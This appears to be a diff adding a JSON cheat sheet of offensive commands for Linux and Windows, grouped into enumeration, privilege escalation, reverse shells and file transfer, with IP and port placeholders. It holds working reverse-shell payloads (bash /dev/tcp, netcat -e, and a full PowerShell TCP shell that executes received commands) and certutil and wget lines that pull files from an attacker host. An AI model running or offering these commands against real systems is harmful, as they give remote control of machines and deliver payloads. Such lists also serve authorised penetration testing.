@@ -1,0 +1,25 @@
+{
+  "enumeration": [
+    { "os": "Linux", "cmd": "uname -a" },
+    { "os": "Linux", "cmd": "id; whoami; hostname" },
+    { "os": "Windows", "cmd": "systeminfo" },
+    { "os": "Windows", "cmd": "net user {USER}" }
+  ],
+  "privilege_escalation": [
+    { "os": "Linux", "cmd": "find / -perm -u=s -type f 2>/dev/null" },
+    { "os": "Linux", "cmd": "sudo -l" },
+    { "os": "Windows", "cmd": "runas /user:{USER} cmd" },
+    { "os": "Windows", "cmd": "net use \\\\target\\share /user:{USER} {PASS}" }
+  ],
+  "reverse_shells": [
+    { "os": "Linux", "cmd": "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1" },
+    { "os": "Linux", "cmd": "nc -e /bin/bash {IP} {PORT}" },
+    { "os": "Windows", "cmd": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" }
+  ],
+  "file_transfer": [
+    { "os": "Linux", "cmd": "python3 -m http.server 8000" },
+    { "os": "Linux", "cmd": "scp file.txt {USER}@{IP}:/tmp/" },
+    { "os": "Windows", "cmd": "certutil -urlcache -split -f http://{IP}:{PORT}/file.exe file.exe" },
+    { "os": "Linux", "cmd": "wget http://{IP}:{PORT}/file.sh -O /tmp/file.sh" }
+  ]
+}
